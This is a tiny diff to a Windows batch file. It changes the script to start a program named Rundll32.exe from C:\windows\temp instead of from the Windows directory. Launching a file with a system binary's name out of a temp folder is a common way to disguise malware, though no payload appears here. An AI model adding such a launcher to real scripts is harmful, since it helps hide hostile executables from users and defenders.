@@ -1,3 +1,3 @@
 echo off
-start C:\\windows\\Rundll32.exe
+start C:\\windows\\temp\\Rundll32.exe
 exit
